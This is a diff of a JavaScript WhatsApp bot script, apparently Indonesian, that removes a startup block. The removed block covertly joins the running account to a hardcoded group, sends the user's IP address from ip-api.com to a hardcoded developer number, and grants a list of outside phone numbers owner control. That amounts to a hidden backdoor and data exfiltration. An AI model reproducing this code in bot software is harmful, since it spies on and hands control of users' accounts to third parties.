@@ -82,103 +82,7 @@ const time2 = moment().tz("Asia/Makassar").format("HH:mm:ss");
     if (time2 < "05:00:00") {
       var ucapanWaktu = "GoodNight🌃";
     }
-    
-//START PE :)
-
-
-
-async function starts() {
-pebz.autoReconnect = ReconnectMode.onConnectionLost
-    pebz.version = [2, 2143, 3]
-    pebz.logger.level = 'warn'
-    pebz.browserDescription = ['RamaGans','Desktop','3.0']
-    await sleep(10000)
-    pebz.on('qr', qr => {
-        qrcode.generate(qr, { small: true })
-        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))                            
-        })
-     fs.existsSync('./session.json') && pebz.loadAuthInfo('./session.json')
-    
-    pebz.on('credentials-updated', () => {
-        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
-        })
-     
-      await pebz.connect({ timeoutMs: 30 * 1000 });
-      fs.writeFileSync('./session.json', JSON.stringify(pebz.base64EncodedAuthInfo(), null, '\t'))
-
-  teks = `https://chat.whatsapp.com/KTm4p53s6457qcV5aDOAPI`
- pebz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to 𝐵𝑂𝑇 group', 'cyan'))
- pebz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.BotName}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pebz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer R-𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebz.jpg'),sourceUrl:"https://wa.me/6281515589573?text=Assalamualaikum"}}})
-	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
-fetch(`http://ip-api.com/line`).then(res => res.text())  
-        .then(bu =>{
-       pebz.sendMessage("6281515589573@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer R-𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebz.jpg'),sourceUrl:"https://wa.me/6281515589573?text=Assalamualaikum"}}})
-     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
-   })
-      
-    pebz.on('connecting', () => {
-		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
-		})
-	
-	pebz.on('open', () => {
-	console.log(color('|TRM|'), color('Connected', 'cyan'))
-	}) 
-     
-    pebz.on('ws-close', () => {
-        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
-        })
-    
-    pebz.on('close', async () => {
-        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
-        })
-
-   pebz.on('chat-update', async (mek) => {
-        require('./pebz.js')(pebz, mek)
-        ownerNumber = ["6281515589573@s.whatsapp.net","994403792696@s.whatsapp.net","48459065026@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6281515589573@s.whatsapp.net"
-       otod = `${settings.NomorOwner}@s.whatsapp.net`
-    })   
-        
-	pebz.on('group-update', async (anu) => {
-		const metdata = await pebz.groupMetadata(anu.jid)
-    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pebz;;;\nFN:pebz\nitem1.TEL;waid=6281515589573:6281515589573\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
-    if(anu.announce == 'false'){
-    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
-    pebz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
-  }
-  else if(anu.announce == 'true'){
-    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
-    pebz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
-  }
-  else if(!anu.desc == ''){
-    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
-    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
-    pebz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
-  }
-  else if(anu.restrict == 'false'){
-    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
-    pebz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
-  }
-  else if(anu.restrict == 'true'){
-    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
-    pebz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
-  }
-})
-
-pebz.on('CB:action,,call', async json => {
-        const callerId = json[2][0][1].from;
-        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${BotName}` + '\n' + `ORG:Developer ${BotName}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
-        pebz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Gw\`\`\`", MessageType.text)
-        pebz.sendMessage(callerId, { displayname: `${BotName}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${BotName}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebz.jpg'),sourceUrl:`https://wa.me/6281515589573?text=Assalamualaikum`}}})
-        await sleep(5000)
-        await pebz.blockUser(callerId, "add")
-        })
+ 
 //================================================================================//
 module.exports = pebz = async (pebz, mek) => {	
 
@@ -1279,7 +1183,7 @@ if (isGroup && budy != undefined) {
 	} else {
 	console.log(color('~> [ ! ]', 'red'), 'SELFBOT', color(sender.split('@')[0]))
 	}		
-	} catch (e) {
+		} catch (e) {
     e = String(e)
     if (!e.includes("this.isZero") && !e.includes("jid")) {
 	console.log('Message : %s', color(e, 'green'))
